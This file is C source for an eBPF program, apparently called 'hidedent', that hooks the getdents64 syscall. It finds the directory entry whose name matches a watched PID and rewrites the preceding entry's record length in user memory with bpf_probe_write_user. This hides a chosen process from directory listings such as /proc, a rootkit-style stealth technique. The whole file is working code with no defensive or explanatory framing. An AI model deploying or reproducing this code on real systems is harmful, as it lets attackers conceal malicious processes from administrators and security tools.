#include "vmlinux.h"
/* #include <linux/bpf.h> */
/* #include <linux/types.h> */
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_tracing.h>
#include <string.h>

#include "hidedent.h"

char LICENSE[] SEC("license") = "Dual BSD/GPL";

struct {
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, 8192);
	__type(key, size_t);
	__type(value, long unsigned int);
} map_buffs SEC(".maps");

struct {
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, 8192);
	__type(key, size_t);
	__type(value, long unsigned int);
} map_buff_prev SEC(".maps");

struct {
	__uint(type, BPF_MAP_TYPE_PROG_ARRAY);
	__uint(max_entries, 32);
	__type(key, u32);
	__type(value, u32);
} map_prog_fd SEC(".maps");

struct {
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, 8192);
	__type(key, int);
	__type(value, struct pid_str);
} map_watched_pid SEC(".maps");

struct {
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, 8192);
	__type(key, size_t);
	__type(value, int);
} map_read_bytes SEC(".maps");

// struct linux_dirent64 {
//     u64        d_ino;    /* 64-bit inode number */
//     u64        d_off;    /* 64-bit offset to next structure */
//     unsigned short d_reclen; /* Size of this dirent */
//     unsigned char  d_type;   /* File type */
//     char           d_name[]; /* Filename (null-terminated) */ };
// int getdents64(unsigned int fd, struct linux_dirent64 *dirp, unsigned int
// count);

SEC("tp/syscalls/sys_enter_getdents64")
int handle_enter_getdents64(struct trace_event_raw_sys_enter *ctx)
{
	size_t pid_tgid = bpf_get_current_pid_tgid();
	struct linux_dirent64 *dent = (struct linux_dirent64 *)ctx->args[1];
	bpf_map_update_elem(&map_buffs, &pid_tgid, &dent, BPF_ANY);
	return 0;
}

SEC("tp/syscalls/sys_exit_getdents64")
int handle_exit_getdents64(struct trace_event_raw_sys_exit *ctx)
{
	size_t pid_tgid = bpf_get_current_pid_tgid();
	int ret = ctx->ret, bpos = 0, key = 0;
	unsigned short d_reclen = 0;
	char filename[MAX_PID_STR_LEN];
	struct linux_dirent64 *dent = NULL;

	if (ret < 0)
		return 0;

	long unsigned int *pbuff_addr =
	    bpf_map_lookup_elem(&map_buffs, &pid_tgid);
	if (!pbuff_addr)
		return 0;

	struct pid_str *watched_pid =
	    bpf_map_lookup_elem(&map_watched_pid, &key);
	if (!watched_pid)
		return 0;

	int *prev_pos = bpf_map_lookup_elem(&map_read_bytes, &pid_tgid);
	if (prev_pos)
		bpos = *prev_pos;

	for (int i = 0; i < 200; i++) {
		if (bpos >= ret)
			break;

		dent = (struct linux_dirent64 *)(*pbuff_addr + bpos);
		bpf_probe_read_user(&d_reclen, sizeof(d_reclen),
				    &dent->d_reclen);
		bpf_probe_read_user(filename, MAX_PID_STR_LEN, &dent->d_name);

		int j = 0;
		for (; j < MAX_PID_STR_LEN; j++) {
			if (j == watched_pid->pid_string_len)
				break;
			if (watched_pid->pid_string[j] != filename[j])
				break;
		}

		/*
		 *  PID matched the filename of dentry
		 */
		if (j == watched_pid->pid_string_len) {
			bpf_tail_call(ctx, &map_prog_fd, patch_prog_idx);
		}
		/*
		 *  PID dismatched the filename of dentry
		 */
		bpf_map_update_elem(&map_buff_prev, &pid_tgid, &dent, BPF_ANY);
		bpos += d_reclen;
	}

	if (ret > bpos) {
		bpf_map_update_elem(&map_read_bytes, &pid_tgid, &bpos, BPF_ANY);
		bpf_tail_call(ctx, &map_prog_fd, exit_prog_idx);
	}

	/*
	 * Delete everything if we can't find matching dentry
	 */
	bpf_map_delete_elem(&map_buffs, &pid_tgid);
	bpf_map_delete_elem(&map_buff_prev, &pid_tgid);
	bpf_map_delete_elem(&map_read_bytes, &pid_tgid);
	return 0;
}

SEC("tp/syscalls/sys_exit_getdents64")
int handle_getdents_patch(struct trace_event_raw_sys_exit *ctx)
{
	unsigned short prev_dent_len = 0, cur_dent_len = 0, new_dent_len = 0;
	size_t pid_tgid = bpf_get_current_pid_tgid();

	long unsigned int *pbuff_addr_prev =
	    bpf_map_lookup_elem(&map_buff_prev, &pid_tgid);
	if (!pbuff_addr_prev)
		return 0;

	struct linux_dirent64 *prev_dent =
	    (struct linux_dirent64 *)(*pbuff_addr_prev);
	bpf_probe_read_user(&prev_dent_len, sizeof(prev_dent_len),
			    &prev_dent->d_reclen);

	struct linux_dirent64 *cur_dent =
	    (struct linux_dirent64 *)((void *)prev_dent + prev_dent_len);
	bpf_probe_read_user(&cur_dent_len, sizeof(cur_dent_len),
			    &cur_dent->d_reclen);
	new_dent_len = prev_dent_len + cur_dent_len;
	bpf_probe_write_user(&prev_dent->d_reclen, &new_dent_len,
			     sizeof(new_dent_len));

	/*
	 * Delete everything if we finished the patch
	 */
	bpf_map_delete_elem(&map_buffs, &pid_tgid);
	bpf_map_delete_elem(&map_buff_prev, &pid_tgid);
	bpf_map_delete_elem(&map_read_bytes, &pid_tgid);
	return 0;
}
